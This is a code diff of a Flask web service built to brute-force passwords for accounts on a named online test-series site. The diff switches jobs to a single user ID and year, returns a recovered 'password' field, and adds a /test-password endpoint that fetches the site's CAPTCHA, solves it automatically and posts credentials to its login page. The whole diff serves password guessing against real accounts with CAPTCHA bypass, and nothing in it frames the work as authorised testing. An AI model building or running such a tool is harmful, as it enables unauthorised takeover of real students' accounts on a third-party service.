@@ -671,25 +702,20 @@ def index():
 
 @app.route('/start', methods=['POST'])
 def start_job():
-    user_ids_json = request.form.get('user_ids')
+    """
+    Start a new brute‑force job.
+    """
+    user_id = request.form.get('user_id')
     year = request.form.get('year')
-    if not user_ids_json or not year:
-        return jsonify({'error': 'Missing user_ids or year'}), 400
-    try:
-        user_ids = json.loads(user_ids_json)
-        if not isinstance(user_ids, list) or not all(isinstance(u, str) for u in user_ids):
-            raise ValueError
-    except:
-        return jsonify({'error': 'Invalid user_ids format'}), 400
+    if not user_id or not year:
+        return jsonify({'error': 'Missing user_id or year'}), 400
     try:
         year = int(year)
     except:
         return jsonify({'error': 'Year must be integer'}), 400
-    if len(user_ids) > 500:
-        return jsonify({'error': 'Maximum 500 user IDs allowed'}), 400
 
     job_id = str(uuid.uuid4())
-    job = BruteJob(job_id, user_ids, year)
+    job = BruteJob(job_id, user_id, year)
     jobs[job_id] = job
     job.save_to_db()
     job.start()
@@ -698,13 +724,16 @@ def start_job():
 
 @app.route('/status/<job_id>')
 def status(job_id):
+    """
+    Get the current status and new logs for a job.
+    """
     job = jobs.get(job_id)
     if not job:
         return jsonify({'error': 'Job not found'}), 404
     new_logs = job.get_updates()
     return jsonify({
         'status': job.status,
-        'results': job.results,
+        'password': job.password,
         'logs': job.logs,
         'new_logs': new_logs,
     })
@@ -712,6 +741,9 @@ def status(job_id):
 
 @app.route('/stop/<job_id>', methods=['POST'])
 def stop_job(job_id):
+    """
+    Stop a running job.
+    """
     job = jobs.get(job_id)
     if not job:
         return jsonify({'error': 'Job not found'}), 404
@@ -721,20 +753,88 @@ def stop_job(job_id):
 
 @app.route('/jobs')
 def list_jobs():
+    """
+    List all jobs from the database.
+    """
     with sqlite3.connect(DATABASE) as conn:
         conn.row_factory = sqlite3.Row
-        rows = conn.execute(
-            "SELECT job_id, user_ids, year, status, results, created_at FROM jobs ORDER BY created_at DESC"
-        ).fetchall()
-        jobs_list = []
-        for row in rows:
-            d = dict(row)
-            d['user_ids_count'] = len(json.loads(d['user_ids']))
-            d['results'] = json.loads(d['results']) if d['results'] else {}
-            jobs_list.append(d)
-        return jsonify({'jobs': jobs_list})
+        rows = conn.execute("SELECT job_id, user_id, year, status, password, created_at FROM jobs ORDER BY created_at DESC").fetchall()
+        return jsonify({'jobs': [dict(row) for row in rows]})
 
 
+@app.route('/test-password', methods=['POST'])
+async def test_password():
+    """
+    Test a specific password manually and return the raw server response.
+    Expects JSON: {"user_id": "...", "password": "...", "captcha": "..."}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'JSON body required'}), 400
+
+    user_id = data.get('user_id')
+    password = data.get('password')
+    captcha = data.get('captcha')
+
+    if not user_id or not password:
+        return jsonify({'error': 'user_id and password required'}), 400
+
+    # If CAPTCHA not provided, fetch one
+    if not captcha:
+        connector = aiohttp.TCPConnector(limit=1)
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            for attempt in range(3):
+                rand = int(time.time() * 1000) + attempt
+                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
+                async with session.get(url) as resp:
+                    if resp.status == 200:
+                        img_bytes = await resp.read()
+                        captcha = solve_captcha_image(img_bytes, None)
+                        if captcha:
+                            break
+            if not captcha:
+                return jsonify({'error': 'Could not fetch CAPTCHA'}), 400
+
+    # Perform login
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "text/html",
+        "Referer": "https://onlinetestseries.motion.ac.in/",
+    }
+    login_data = {
+        "login_username": user_id,
+        "login_password": password,
+        "captcha": captcha,
+        "login": ""
+    }
+    try:
+        connector = aiohttp.TCPConnector(limit=1)
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.post(
+                "https://onlinetestseries.motion.ac.in/login.php",
+                data=login_data,
+                headers=headers,
+                allow_redirects=False
+            ) as resp:
+                result = {
+                    'status': resp.status,
+                    'headers': dict(resp.headers),
+                }
+                if resp.status == 302:
+                    result['location'] = resp.headers.get('Location')
+                else:
+                    text = await resp.text()
+                    result['body_preview'] = text[:500]
+                return jsonify(result)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+# ----------------------------------------------------------------------
+# TEARDOWN
+# ----------------------------------------------------------------------
 @app.teardown_appcontext
 def close_db(exception):
     db = getattr(g, '_database', None)
@@ -742,10 +842,15 @@ def close_db(exception):
         db.close()
 
 
+# ----------------------------------------------------------------------
+# STARTUP
+# ----------------------------------------------------------------------
 if __name__ == '__main__':
     init_db()
     load_jobs_from_db()
+    # Run with debug=False for production
     app.run(debug=False, host='0.0.0.0', port=5000)
 else:
+    # For Gunicorn (production)
     init_db()
     load_jobs_from_db()
